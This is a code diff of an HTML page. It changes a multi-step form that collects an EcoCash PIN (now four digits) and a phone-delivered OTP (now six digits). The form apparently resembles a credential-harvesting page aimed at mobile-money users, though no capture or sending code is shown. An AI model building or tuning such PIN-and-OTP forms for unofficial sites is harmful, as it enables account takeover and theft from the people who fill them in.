@@ -171,14 +171,13 @@
                 <p class="step-sub">Step 4 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-                <div class="pin-label">Enter your EcoCash PIN (5 digits):</div>
+                <div class="pin-label">Enter your EcoCash PIN (4 digits):</div>
                 <div id="pinAttemptsDisplay" class="pin-attempts">🔑 Attempts remaining: 3 of 3</div>
                 <div class="pin-row">
                     <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" aria-label="PIN digit 1" />
                     <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" aria-label="PIN digit 2" />
                     <input type="password" id="pin2" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" placeholder="•" aria-label="PIN digit 3" />
                     <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" aria-label="PIN digit 4" />
-                    <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" aria-label="PIN digit 5" />
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
                     <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
                 </div>
@@ -197,15 +196,17 @@
         <div class="step-center">
             <div class="step-card">
                 <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP sent to your phone via EcoCash</p>
+                <p class="step-sub">Enter the 6-digit OTP sent to your phone via EcoCash</p>
                 <div class="otp-section">
-                    <div class="otp-section-title">OTP Code (4 digits):</div>
+                    <div class="otp-section-title">OTP Code (6 digits):</div>
                     <div style="display: flex; align-items: center;">
                         <div class="otp-inputs" id="otpInputs">
                             <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 1">
                             <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 2">
                             <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 3">
                             <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 4">
+                            <input type="password" id="otp4" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 5">
+                            <input type="password" id="otp5" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" aria-label="OTP digit 6">
                         </div>
                         <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
                     </div>
